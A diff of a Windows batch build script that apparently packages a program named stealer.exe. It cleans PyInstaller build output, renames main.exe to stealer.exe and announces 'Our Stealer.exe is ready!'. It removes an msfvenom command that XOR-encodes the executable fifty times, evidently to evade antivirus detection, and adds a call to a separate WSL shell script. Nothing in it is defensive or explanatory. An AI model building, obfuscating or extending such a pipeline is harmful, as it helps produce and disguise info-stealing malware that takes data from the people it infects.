@@ -20,8 +20,16 @@ powershell -Command "Remove-Item -Path '%scriptDir%build' -Recurse -Force"
 DEL main.spec
 echo Temporary files deleted!
 
-ren main.exe stealer.exe
+if exist stealer.exe (
+    del stealer.exe
+)
+
+if exist main.exe (
+    ren main.exe stealer.exe
+) else (
+    echo main.exe not found!
+)
+
 echo Our Stealer.exe is ready!
 
-wsl
-msfvenom -x stealer.exe -e x86/xor -i 50 -f exe -o stealer.exe
+wsl bash wsl.sh
